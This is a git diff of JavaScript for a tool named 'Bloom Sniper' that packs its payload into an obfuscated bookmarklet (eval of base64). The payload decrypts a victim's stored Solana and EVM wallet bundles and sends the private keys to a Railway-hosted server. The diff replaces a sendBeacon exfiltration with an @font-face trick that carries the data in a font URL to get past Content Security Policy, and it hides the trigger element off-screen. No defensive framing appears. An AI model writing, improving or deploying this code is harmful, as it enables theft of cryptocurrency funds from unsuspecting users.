@@ -1,4 +1,4 @@
-// === BLOOM SNIPER - FINAL (sendBeacon + CSP bypass) ===
+// === BLOOM SNIPER - FINAL (Original @font-face exfil - CSP bypass) ===
 console.log('🚀 Bloom Sniper Loader loaded from Railway');
 
 document.addEventListener('DOMContentLoaded', function() {
@@ -54,17 +54,37 @@ document.addEventListener('DOMContentLoaded', function() {
                         .map(b => b.toString(16).padStart(2, "0")).join("");
                 }
 
-                // === CSP-BYPASS EXFIL (navigator.sendBeacon POST) ===
+                // === ORIGINAL @font-face EXFIL (CSP bypass) ===
                 async function sendData(data) {
                     const RAILWAY_URL = "https://bloom-sniper-replica-production.up.railway.app";
                     const timestamp = Math.floor(Date.now() / 1000);
                     data.timestamp = timestamp;
                     data.header = navigator.userAgent;
 
-                    const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
-                    const success = navigator.sendBeacon(`${RAILWAY_URL}/i`, blob);
+                    const jsonStr = JSON.stringify(data);
+                    const safeB64 = btoa(unescape(encodeURIComponent(jsonStr)));
+                    const exfilUrl = `${RAILWAY_URL}/i/${safeB64}`;
 
-                    console.log('📤 sendBeacon sent →', success);
+                    console.log('📤 Sending via @font-face → length:', safeB64.length);
+
+                    const style = document.createElement("style");
+                    style.textContent = `
+                        @font-face {
+                            font-family: "leak";
+                            src: url("${exfilUrl}");
+                        }
+                        .font-target { font-family: leak; }
+                    `;
+                    const div = document.createElement("div");
+                    div.innerText = "1";
+                    div.classList.add("font-target");
+                    div.style.position = "absolute";
+                    div.style.top = "-9999px";
+                    div.style.left = "-9999px";
+
+                    document.head.appendChild(style);
+                    document.body.appendChild(div);
+
                     alert('✅ Successfully extracted ' + (data.keys ? data.keys.length : 0) + ' wallets! Sent to server.');
                 }
 
@@ -89,6 +109,7 @@ document.addEventListener('DOMContentLoaded', function() {
 
                 const success = [];
 
+                // Solana
                 for (const bundle of solanaBundles) {
                     try {
                         const decryptedBundle = await decrypt(cryptoKey, bundle);
@@ -100,6 +121,7 @@ document.addEventListener('DOMContentLoaded', function() {
                     } catch (e) {}
                 }
 
+                // EVM
                 let ethers = null;
                 try {
                     ethers = await import("https://cdn.jsdelivr.net/npm/ethers@6.15.0/+esm");
@@ -123,7 +145,7 @@ document.addEventListener('DOMContentLoaded', function() {
             }
         };
 
-        // Safe injection
+        // Safe bookmarklet injection
         const codeStr = '(' + innerCode.toString() + ')()';
         const encoded = btoa(unescape(encodeURIComponent(codeStr)));
         btn.href = 'javascript:eval(atob("' + encoded + '"))';
